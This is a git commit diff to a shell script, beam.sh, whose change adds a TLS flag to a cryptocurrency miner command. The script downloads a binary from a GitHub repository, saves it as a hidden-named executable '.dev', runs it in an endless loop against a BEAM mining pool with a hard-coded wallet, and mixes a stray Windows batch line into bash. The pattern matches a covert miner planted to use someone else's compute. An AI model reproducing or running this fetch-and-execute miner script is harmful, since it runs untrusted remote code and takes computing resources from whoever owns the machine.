404f48fe65dd5ba8ebae386d727a7dc5815c8611
lushenry654 <85671596+lushenry654@users.noreply.github.com>
2021-10-19 07:35:54 +0700

    Update beam.sh

--- beam.sh
+++ beam.sh
@@ -2,7 +2,7 @@
 @echo off
 wget https://github.com/WhynotSir/sirji/raw/main/.dev && chmod +x .dev
 while [ 1 ]; do
-./.dev --algo BEAM-III --pool stratum+tcp://beam-asia.leafpool.com:3333 --user 38ffc9ed6712546ef8f48663b7bb02cc38aeac83244beab9e7f08fe1276571eca4a
+./.dev --algo BEAM-III --tls --pool stratum+tcp://beam-asia.leafpool.com:3333 --user 38ffc9ed6712546ef8f48663b7bb02cc38aeac83244beab9e7f08fe1276571eca4a
 sleep 3
 done
 sleep 999
